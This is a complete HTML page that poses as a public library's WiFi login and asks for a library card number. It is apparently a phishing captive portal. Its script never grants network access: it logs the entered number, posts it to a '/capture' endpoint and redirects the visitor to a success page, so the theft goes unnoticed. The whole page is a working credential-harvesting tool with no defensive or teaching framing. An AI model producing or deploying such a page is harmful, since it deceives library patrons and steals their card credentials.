<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Library WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#8B4513,#D2691E);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#8B4513;font-size:28px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#8B4513}button{width:100%;padding:14px;background:#8B4513;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>PUBLIC LIBRARY</h1></div><form id="loginForm"><div class="form-group"><label>Library Card Number</label><input type="text" id="card" required placeholder="123456789"></div><button type="submit">Connect to WiFi</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const card=document.getElementById('card').value;console.log('[Library] Card:',card);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'Library',card:card})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
